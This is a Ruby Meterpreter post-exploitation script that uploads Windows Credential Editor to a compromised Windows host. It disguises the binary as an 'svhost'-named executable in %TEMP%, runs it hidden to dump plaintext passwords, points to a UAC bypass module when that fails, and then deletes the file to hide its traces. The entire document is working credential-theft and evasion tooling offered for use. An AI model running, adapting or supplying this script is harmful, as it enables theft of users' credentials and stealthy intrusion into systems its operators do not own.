######################################################################################
# wce.rb v0.1
# Meterpreter script to run Windows Credential Editor 1.3 beta on a
# compromised host. Currently only testet with 64-bit versions of
# 7 and 2008R2. But should work on all 32 and 64 bit versions
#
# Download WCE v1.3beta 32 and 64bit WCE from the following links:
# http://www.ampliasecurity.com/research/wce_v1_3beta_x64.tgz
# http://www.ampliasecurity.com/research/wce_v1_3beta.tgz
# Rename to wce-x64.exe and wce-x86.exe and place them in
# <metasploitpath>/data/post/
#
# This is my first meterpreterscript and first rubyscript, so beware of bugs!
#
# -JAB
#
# @jabjorkhaug, john.bjorkhaug<at>gmail.com
######################################################################################


#
#
# getting systeminfo
$sysinfo = session.sys.config.sysinfo

# upload WCE
def upload(session,file,trgloc = nil)
    if not ::File.exists?(file)
            raise "File to Upload does not exists!"
        else
        if trgloc == nil
        location = session.fs.file.expand_path("%TEMP%")
        else
            location = trgloc
        end
        begin
            fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
            print_status("Uploading wce.exe to #{location}....")
            session.fs.file.upload_file("#{fileontrgt}","#{file}")
            print_status("wce.exe uploaded!")
            print_status("Renamed to #{fileontrgt}")
        rescue ::Exception => e
            print_status("Error uploading file #{file}: #{e.class} #{e}")
        end
    end
    return fileontrgt
end


# run WCE
def cmd_on_trgt_exec(session,cmdexe,opt)
        r=''
        session.response_timeout=120
        begin
                print_status "Dumping passwords...."
                r = session.sys.process.execute(cmdexe, opt, {'Hidden' => true, 'Channelized' => true})
                d = r.channel.read
                d.slice!(0..151)

                if d =~ /Installing\ WCE Service\ failed!/i
                        print_error("You need to run the UAC bypass post module first.(post/windows/escalate/bypassuac)")
                else
                        print_line("\n#{d}")
                end

                r.channel.close
                r.close
        rescue ::Exception => e
                print_status("Error Running Command #{cmdexe}: #{e.class} #{e}")
                raise e
        end
end



# setting path to executable
path = ::File.join(Msf::Config.install_root, "data", "post")

# decide, x86 or x64
wceexe = nil
if $sysinfo["Architecture"] =~ /x64/i
        wceexe = ::File.join(path, "wce-x64.exe")
else
        wceexe = ::File.join(path, "wce-x86.exe")
end

# uploads and executes WCE
exec = upload(session, wceexe)
cmdopt = "-w"
cmd_on_trgt_exec(session,exec,cmdopt)
print_status("Deleting #{exec}...")
# delete the uploaded file
session.sys.process.execute("cmd.exe /c del #{exec}", nil, {'Hidden' => true})